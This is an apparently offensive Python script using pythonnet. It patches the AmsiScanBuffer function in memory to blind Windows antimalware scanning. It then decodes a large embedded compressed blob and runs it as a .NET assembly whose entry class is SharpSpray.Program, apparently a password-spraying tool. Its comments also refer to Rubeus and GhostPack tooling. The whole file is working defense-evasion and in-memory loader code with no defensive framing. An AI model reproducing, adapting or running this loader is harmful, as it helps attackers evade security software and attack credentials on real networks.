import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpSpray.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()